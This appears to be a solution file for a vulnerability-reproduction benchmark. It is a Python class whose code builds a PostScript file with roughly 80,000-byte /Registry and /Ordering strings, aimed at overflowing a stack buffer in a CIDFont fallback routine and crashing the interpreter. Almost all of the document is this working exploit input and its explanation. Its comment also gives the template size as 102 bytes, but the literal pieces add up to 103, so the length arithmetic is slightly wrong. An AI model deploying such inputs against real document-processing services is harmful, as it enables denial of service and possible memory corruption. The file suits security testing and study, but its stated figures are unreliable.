class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in the CIDFont fallback
        mechanism. It occurs when a fallback font name is constructed by
        concatenating the /Registry and /Ordering strings from a CIDSystemInfo
        dictionary. If these strings are too long, they can overflow a
        fixed-size buffer on the stack.

        This PoC creates a PostScript file that constructs a font dictionary
        on the stack. This dictionary contains a /CIDSystemInfo entry with
        oversized /Registry and /Ordering strings. The `findfont` operator
        is then called. This operator triggers the font lookup process, which,
        upon failing to find a direct match, invokes the vulnerable fallback
        mechanism. The concatenation of the long strings overflows the buffer,
        leading to a crash.

        The payload lengths are calculated to match the ground-truth PoC
        length of 80064 bytes, which is a safe approach to ensure the
        vulnerability is triggered as expected.
        """
        
        # The PostScript template boilerplate has a fixed size.
        # Template:
        # <<
        #   /Subtype /CIDFontType0
        #   /CIDSystemInfo <<
        #     /Registry (...)
        #     /Ordering (...)
        #   >>
        # >>
        # findfont pop
        # The length of this template, excluding the payload strings themselves,
        # is 102 bytes.
        template_len = 102
        target_len = 80064

        # Calculate the required total length for the malicious payloads.
        total_payload_len = target_len - template_len

        # Distribute the payload length evenly between Registry and Ordering.
        registry_len = total_payload_len // 2
        ordering_len = total_payload_len - registry_len

        # Generate the payload strings.
        registry_payload = b'A' * registry_len
        ordering_payload = b'B' * ordering_len

        # Assemble the final PoC by inserting the payloads into the template.
        poc = (
            b'<<\n'
            b'  /Subtype /CIDFontType0\n'
            b'  /CIDSystemInfo <<\n'
            b'    /Registry (' + registry_payload + b')\n'
            b'    /Ordering (' + ordering_payload + b')\n'
            b'  >>\n'
            b'>>\n'
            b'findfont pop\n'
        )
        
        return poc
